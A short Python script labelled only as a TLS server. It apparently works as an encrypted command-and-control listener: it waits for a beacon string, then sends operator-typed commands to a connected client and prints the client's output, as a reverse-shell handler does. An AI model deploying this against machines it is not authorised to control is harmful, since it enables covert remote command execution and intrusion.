# TLS
Py TLS server. 

# Save as tls_server.py
import socket
import ssl

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="server.crt", keyfile="server.key")  # Generate these with OpenSSL
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("192.168.1.100", 8443))
server_socket.listen(5)
ssl_socket = context.wrap_socket(server_socket, server_side=True)

print("Listening on 192.168.1.100:8443...")
client_socket, addr = ssl_socket.accept()
print(f"Connected from {addr}")

while True:
    data = client_socket.recv(1024).decode()
    if not data:
        break
    if data.startswith("CONNECTION_RESET"):
        print("Connection established")
        continue
    command = input("Command: ")
    client_socket.send(command.encode())
    response = client_socket.recv(65535).decode()
    print(response)

client_socket.close()
ssl_socket.close()
